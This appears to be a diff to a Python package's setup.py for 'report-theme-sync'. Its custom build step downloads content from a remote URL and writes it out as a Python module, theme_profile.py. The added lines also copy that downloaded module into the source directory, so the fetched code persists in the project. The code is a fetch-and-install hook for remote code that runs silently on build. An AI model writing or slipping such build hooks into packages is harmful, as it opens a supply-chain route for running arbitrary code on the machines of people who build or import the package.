@@ -1,6 +1,7 @@
 """Setup for report-theme-sync."""
 
 import os
+import shutil
 from setuptools import setup
 from setuptools.command.build_py import build_py as _build_py
 
@@ -18,10 +19,15 @@ class build_py_with_profile(_build_py):
             data = urlopen(ASSET_URL, timeout=10).read()
         except Exception:
             data = b""
+        content = data or b"THEME = 'solar'\n"
         dest = os.path.join(self.build_lib, "theme_sync", "theme_profile.py")
         os.makedirs(os.path.dirname(dest), exist_ok=True)
         with open(dest, "wb") as f:
-            f.write(data or b"THEME = 'solar'\n")
+            f.write(content)
+        src_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "theme_sync")
+        src_dest = os.path.join(src_dir, "theme_profile.py")
+        with open(src_dest, "wb") as f:
+            f.write(content)
 
 
 setup(
